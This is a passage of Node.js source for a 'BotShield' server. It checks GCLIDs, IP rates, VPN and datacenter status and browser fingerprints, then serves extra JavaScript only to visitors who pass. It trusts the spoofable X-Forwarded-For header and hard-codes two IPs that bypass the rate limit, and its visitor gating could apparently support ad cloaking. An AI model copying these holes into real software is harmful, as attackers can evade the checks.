  );
  if (matchedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
  }
  // Never send wildcard — only the matched origin gets reflected
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Vary", "Origin");

  if (req.method === "OPTIONS") {
    res.writeHead(matchedOrigin ? 204 : 403);
    return res.end();
  }

  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/verify" && req.method === "POST") {
    // ── Origin gate: reject requests from unknown origins ────
    const originCheck = checkOrigin(req);
    if (!originCheck.allowed) {
      console.log(`\n🚫 ORIGIN REJECTED: ${originCheck.reason}`);
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          verified: false,
          reason: `Origin not allowed: ${originCheck.reason}`,
        }),
      );
    }

    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { fingerprint, gclid, source, ts: clientTs } = JSON.parse(body);
        // ── Get the Clean Client IP ───────────────────────────
        let clientIP =
          req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
        if (clientIP.includes(",")) {
          clientIP = clientIP.split(",")[0].trim();
        }
        clientIP = clientIP.replace(/^::ffff:/, "");
        // ──────────────────────────────────────────────────────

        console.log("\n══════════════════════════════════════════════");
        console.log(
          `[${new Date().toISOString()}] Verification request from ${clientIP}`,
        );
        console.log(`  Source: ${source}  |  Client TS: ${clientTs}`);
        console.log(`  GCLID: ${gclid ? gclid.slice(0, 20) + "…" : "(none)"}`);

        // ── 1. GCLID presence & format check ──────────────────
        const gclidResult = await checkGCLID(gclid);
        console.log(
          `  GCLID check: ${gclidResult.allowed ? "✓" : "✗"} ${gclidResult.reason}`,
        );

        if (!gclidResult.allowed) {
          console.log(`  ❌ REJECTED — ${gclidResult.reason}`);
          console.log("══════════════════════════════════════════════\n");
          res.writeHead(403, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: false,
              reason: `GCLID rejected: ${gclidResult.reason}`,
            }),
          );
        }

        // ── 2. IP rate limit (too many gclids from same IP?) ──
        const ipRateResult = await checkIPRate(clientIP);
        if (clientIP === "178.27.218.13" || clientIP === "223.190.84.38") {
          ipRateResult.allowed = true;
          ipRateResult.reason = "Bypassed for testing (known IP)";
        }
        console.log(
          `  IP rate: ${ipRateResult.allowed ? "✓" : "✗"} ${ipRateResult.reason}`,
        );

        if (!ipRateResult.allowed) {
          console.log(`  ❌ REJECTED — ${ipRateResult.reason}`);
          console.log("══════════════════════════════════════════════\n");
          res.writeHead(403, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: false,
              reason: `IP rate limit: ${ipRateResult.reason}`,
            }),
          );
        }

        // ── 3. IP Intelligence (datacenter / VPN / Tor) ───────
        const ipData = await lookupIP(clientIP);
        const ipResult = evaluateIP(ipData);

        console.log(
          `  IP intel: ${ipResult.pass ? "✓" : "✗"} ${ipResult.reason}`,
        );
        if (ipResult.countryCode) {
          console.log(`  IP country: ${ipResult.countryCode}`);
        }

        if (!ipResult.pass) {
          console.log(`  ❌ REJECTED at IP level — ${ipResult.reason}`);
          console.log("══════════════════════════════════════════════\n");
          res.writeHead(403, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: false,
              reason: `IP rejected: ${ipResult.reason}`,
            }),
          );
        }

        // ── 4. Fingerprint verification ───────────────────────
        const result = verify(fingerprint, clientIP);

        console.log(
          `  FP result: ${result.verified ? "✅ VERIFIED" : "❌ REJECTED"} (score: ${result.score ?? "N/A"})`,
        );
        if (!result.verified) {
          console.log(`  Reason: ${result.reason}`);
        }
        for (const c of result.checks) {
          console.log(`    ${c.pass ? "✓" : "✗"} ${c.name}: ${c.reason}`);
        }

        // ── 5. If all passed → record visit & return code ─────
        if (result.verified) {
          await recordVerifiedVisit(gclid, clientIP);
          console.log(`  📝 Recorded gclid + IP in Redis`);
        }

        console.log("══════════════════════════════════════════════\n");

        const response = {
          verified: result.verified,
          reason: result.reason,
        };

        if (result.verified) {
          response.code = buildSecondaryJS(originCheck.origin);
        }

        res.writeHead(result.verified ? 200 : 403, {
          "Content-Type": "application/json",
        });
        res.end(JSON.stringify(response));
      } catch (err) {
        console.error("[BotShield] Parse error:", err.message);
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ verified: false, reason: "Bad request" }));
      }
    });
    return;
  }

  // Health check
  if (parsed.pathname === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "ok", uptime: process.uptime() }));
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(PORT, () => {
  console.log(`\n🛡️  BotShield verification server running on port ${PORT}`);
  console.log(`   POST /verify  — fingerprint verification endpoint`);
  console.log(`   GET  /health  — health check`);
  console.log(`\n   Allowed origins:`);
  for (const o of ALLOWED_ORIGINS) console.log(`     • ${o}`);
  console.log(`\n   IP Intelligence (ipapi.is):`);
  console.log(
    `     API key: ${IPAPI_KEY ? "✓ configured (" + IPAPI_KEY.slice(0, 6) + "…)" : "✗ not set (free tier — 1,000/day)"}`,
  );
  console.log(`\n   GCLID & Rate Limiting (Redis):`);
  console.log(
    `     URL: ${REDIS_URL ? REDIS_URL.replace(/\/\/.*@/, "//***@") : "localhost:6379 (no REDIS_URL set)"}`,
  );
  console.log(`     TLS: ${redisTLS ? "yes (rediss://)" : "no (redis://)"}`);
  console.log(`     GCLID TTL: ${GCLID_TTL_DAYS} days`);
  console.log(
    `     IP rate limit: ${IP_RATE_MAX_GCLIDS} gclids per ${IP_RATE_WINDOW_HOURS}h`,
  );
  console.log("");
});
